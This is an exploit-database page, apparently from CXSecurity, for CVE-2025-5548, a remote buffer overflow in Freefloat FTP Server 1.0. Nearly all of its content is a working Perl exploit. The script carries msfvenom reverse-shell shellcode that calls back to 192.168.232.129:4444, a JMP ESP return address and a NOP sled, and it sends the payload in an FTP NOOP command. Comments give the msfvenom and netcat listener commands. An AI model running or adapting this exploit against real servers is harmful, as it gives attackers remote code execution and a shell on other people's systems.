---
title: Freefloat FTP Server 1.0 Remote Buffer Overflow
url: https://cxsecurity.com/issue/WLB-2025060017
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2025-06-16
fetch_date: 2025-10-06T22:52:06.440587
---

# Freefloat FTP Server 1.0 Remote Buffer Overflow

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **Freefloat FTP Server 1.0 Remote Buffer Overflow** **2025.06.15**  Credit:  **[Fernando](https://cxsecurity.com/author/Fernando/1/)**  Risk: **High**  Local: **No**  Remote: ****Yes****  CVE: **[CVE-2025-5548](https://cxsecurity.com/cveshow/CVE-2025-5548/ "Click to see CVE-2025-5548")**  CWE: **[CWE-119](https://cxsecurity.com/cwe/CWE-119 "Click to see CWE-119")** | |

# Exploit Title: Freefloat FTP Server 1.0 - Remote Buffer Overflow
# Date: 22 may 2025
# Notification vendor: No reported
# Discovery by: Fernando Mengali
# LinkedIn: https://www.linkedin.com/in/fernando-mengali-273504142/
# Version: 1.0
# Tested on: Windows XP SP3 English - # Version 5.1 (Build 2600.xpsp.080413-2111 : Service Pack 3)
# Vulnerability Type: Remote Buffer Overflow
# CVE: CVE-2025-5548
#offset: 246
#badchars: \x00\x0a\x0d
#EIP: 0x7C86467B (JMP ESP)
#Kernel32.dll
use IO::Socket::INET;
# msfvenom -p windows/shell\_reverse\_tcp lhost=192.168.232.129 lport=4444 EXITFUNC=thread -b '\x00\x0a\x0d' -a x86 --platform Windows -f perl
# nc -vlp 4444
# execute exploit
my $buf =
"\xda\xd4\xbb\x4e\xd9\xfd\x96\xd9\x74\x24\xf4\x58\x2b\xc9" .
"\xb1\x52\x31\x58\x17\x83\xc0\x04\x03\x16\xca\x1f\x63\x5a" .
"\x04\x5d\x8c\xa2\xd5\x02\x04\x47\xe4\x02\x72\x0c\x57\xb3" .
"\xf0\x40\x54\x38\x54\x70\xef\x4c\x71\x77\x58\xfa\xa7\xb6" .
"\x59\x57\x9b\xd9\xd9\xaa\xc8\x39\xe3\x64\x1d\x38\x24\x98" .
"\xec\x68\xfd\xd6\x43\x9c\x8a\xa3\x5f\x17\xc0\x22\xd8\xc4" .
"\x91\x45\xc9\x5b\xa9\x1f\xc9\x5a\x7e\x14\x40\x44\x63\x11" .
"\x1a\xff\x57\xed\x9d\x29\xa6\x0e\x31\x14\x06\xfd\x4b\x51" .
"\xa1\x1e\x3e\xab\xd1\xa3\x39\x68\xab\x7f\xcf\x6a\x0b\x0b" .
"\x77\x56\xad\xd8\xee\x1d\xa1\x95\x65\x79\xa6\x28\xa9\xf2" .
"\xd2\xa1\x4c\xd4\x52\xf1\x6a\xf0\x3f\xa1\x13\xa1\xe5\x04" .
"\x2b\xb1\x45\xf8\x89\xba\x68\xed\xa3\xe1\xe4\xc2\x89\x19" .
"\xf5\x4c\x99\x6a\xc7\xd3\x31\xe4\x6b\x9b\x9f\xf3\x8c\xb6" .
"\x58\x6b\x73\x39\x99\xa2\xb0\x6d\xc9\xdc\x11\x0e\x82\x1c" .
"\x9d\xdb\x05\x4c\x31\xb4\xe5\x3c\xf1\x64\x8e\x56\xfe\x5b" .
"\xae\x59\xd4\xf3\x45\xa0\xbf\x3b\x31\x42\xbe\xd4\x40\x92" .
"\xd0\x78\xcc\x74\xb8\x90\x98\x2f\x55\x08\x81\xbb\xc4\xd5" .
"\x1f\xc6\xc7\x5e\xac\x37\x89\x96\xd9\x2b\x7e\x57\x94\x11" .
"\x29\x68\x02\x3d\xb5\xfb\xc9\xbd\xb0\xe7\x45\xea\x95\xd6" .
"\x9f\x7e\x08\x40\x36\x9c\xd1\x14\x71\x24\x0e\xe5\x7c\xa5" .
"\xc3\x51\x5b\xb5\x1d\x59\xe7\xe1\xf1\x0c\xb1\x5f\xb4\xe6" .
"\x73\x09\x6e\x54\xda\xdd\xf7\x84\x1f\xd2\x90\x6e\x70\xeb" .
"\x82\x52\x75\x11\x7b\x02\x0c\x9f\x7b\x6c\x48\x37\x2a\x59" .
"\x07\x94\x51\xcc\xde\xc5\x30\x84\x22\x97\x58\x0e\x12\x72" .
"\x5a\x1a\x4b\x9a\x5a\x7c\x4e\x04\x2e\x14\x48\xbc\x67\x9b" .
"\x9d\x6c\xa9\x79\x0f\x4f\x08\xbd\x2e\xec\xaa\x45\x64\x09" .
"\xe2\x98\x56\x62\xde\x65\xf2\x48\x4e\xec\x79\x1b\x4c\x9d" .
"\xa5\xda\x47\xd3\xa5\x53\xa3\xaa\x52\x11\x25\xdb\x6a\x62" .
"\xc3\x5a\x3a\x90\xab\x70\x4e\x74\x4a\x12\xae\x53\x54\xda" .
"\x38\x90\x70\x58\x98\xac\x2b\xdb\x7c\x48\x5f\x1e\x4a\x4a" .
"\x1e\x84\x28";
my $offset = 246; # Será substituído depois
my $eip = pack('V', 0x7c86467b); # Endereço JMP ESP little endian
my $nop = "\x90" x 20;
my $padding = "A" x $offset;
my $payload = $padding . $eip . $nop . $buf;
my $socket = IO::Socket::INET->new(
PeerAddr => '192.168.232.135',
PeerPort => '21',
Proto => 'tcp'
) or die "Failed to connect: $!\n";
print "Connected to FTP server\n";
my $response = "";
$response = <$socket>; # banner inicial do FTP
print $socket "USER anonymous\r\n";
$response = <$socket>;
print $socket "PASS anonymous\r\n";
$response = <$socket>;
print $socket "NOOP $payload\r\n";
$response = <$socket>;
print "Payload sent, check your listener.\n";
close $socket;

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2025060017)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2025**, cxsecurity.com

|  |

Back to Top